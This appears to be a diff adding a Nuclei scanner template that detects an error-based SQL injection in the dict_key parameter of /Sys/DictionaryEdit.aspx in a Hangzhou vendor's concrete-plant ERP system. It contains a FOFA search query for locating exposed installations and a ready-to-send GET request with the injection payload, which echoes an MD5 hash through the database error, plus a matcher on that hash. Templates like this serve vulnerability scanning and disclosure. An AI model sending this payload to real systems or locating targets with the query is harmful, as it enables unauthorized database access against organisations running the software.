@@ -1,0 +1,25 @@
+id: hehua-sh-erp-dictionaryedit-sqli
+
+info:
+  name: 商混ERP系统 DictionaryEdit.aspx 页面存在SQL注入
+  author: m0be1
+  severity: high
+  description: 杭州荷花软件有限公司开发的商混ERP系统。这套系统主要是处理建筑公司或者各项工程的搅拌站管理，内部含有销售模块、生产管理模块、实验室模块、人员管理等，该公司的商品混凝土ERP系统/Sys/DictionaryEdit.aspx处dict_key参数存在SQL报错注入漏洞，攻击者可通过该漏洞获取数据库权限。
+  
+  reference:
+    - https://
+  metadata: 
+    fofa-query: title="商混ERP系统"
+    verified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |     
+        GET /Sys/DictionaryEdit.aspx?dict_key=1%27%20and%201=convert(varchar(100),substring(sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27)),3,32))-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==500 && contains_all(body,"e10adc3949ba59abbe56e057f20f883e")'
